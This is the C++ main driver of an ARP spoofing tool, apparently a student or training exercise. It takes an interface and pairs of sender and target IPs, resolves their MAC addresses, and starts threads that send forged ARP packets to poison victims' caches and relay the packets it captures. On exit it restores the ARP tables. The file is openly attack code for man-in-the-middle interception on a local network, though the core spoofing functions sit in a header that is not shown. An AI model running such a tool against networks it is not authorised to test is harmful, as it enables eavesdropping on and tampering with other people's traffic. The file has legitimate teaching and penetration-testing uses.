#include <iostream>
#include <csignal>
#include <pcap.h>

#include "arp-spoof.hpp"

using namespace std;

pcap_t* pcap;

// for communicating between caller and callee
volatile bool isEnd;

mutex mPcap, mRequest, mNonPeriod;
condition_variable cvRequest, cvPeriod;

vector<struct attackInfo> victims;
static Mac* myMACPtr;

/*
 * Keyboard interrupt handler
*/
void InterruptHandler(const int signo) {
    if(signo == SIGINT or signo == SIGTERM) {
        if(signo == SIGINT) cout << "\nKeyboard Interrupt\n";
        else cout << "\nTermination request sent to the program\n";

        isEnd = true;

        cvRequest.notify_all();
        cvPeriod.notify_all();

        ARPRecover(pcap, *myMACPtr, victims);

        if(pcap != NULL) pcap_close(pcap);
        
        exit(0);
    }
}

int main(int argc, char* argv[]) {
    signal(SIGINT, InterruptHandler);
    signal(SIGTERM, InterruptHandler);

    // Wrong parameter
    if(argc < 4 or argc bitand 1) {
        cerr << "Error: Wrong parameters are given\n";
        cerr << "syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n";
        cerr << "sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2" << endl;

        return 1;
    }

    char* dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    Mac myMAC, sendMAC, targetMAC;
    IPv4 myIP, sendIP, targetIP;
    int i;

    dev = argv[1];

    // Turn promiscuous mode on to receive others' packet by give third parameter 1
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if(pcap == NULL) {
        cerr << "Error: Error while open device " << dev << '\n';
        cerr << errbuf << endl;

        return 1;
    }

#ifdef DEBUG
    cout << "[DEBUG] Successfully open pcap\n";
#endif

    // Get my IP and MAC address
    if(not getMyInfo(dev, myMAC, myIP)) return 1;
    myMACPtr = &myMAC;

#ifdef DEBUG
    cout << "[DEBUG] Successfully get local information\n";
#endif

    // get MAC addresses of sender and target
    for(i = 1; i < (argc >> 1); i++) {
        sendIP = IPv4(argv[i << 1]);
        targetIP = IPv4(argv[(i << 1) + 1]);
        
        // Resolve sender and target's MAC address
        if(not resolveMACByIP(pcap, sendMAC, sendIP, myMAC, myIP)) return 1;
        if(not resolveMACByIP(pcap, targetMAC, targetIP, myMAC, myIP)) return 1;

#ifdef DEBUG
    cout << "[DEBUG] Successfully get MAC addresses from sender and target\n";
#endif

        victims.push_back({sendMAC, targetMAC, sendIP, targetIP});

        // print information to check each addresses
        printInfo(myMAC, myIP, sendMAC, sendIP, targetMAC, targetIP);
    }

    // send fake ARP packets to each senders in victim pairs
    thread periodThread(periodAttack, pcap, myMAC, victims);

    // manage received packets
    thread managerThread(managePackets, pcap, myMAC, victims);

    periodThread.join();
    managerThread.join();

    if(not ARPRecover(pcap, myMAC, victims)) return 1;

    pcap_close(pcap);

    return 0;
}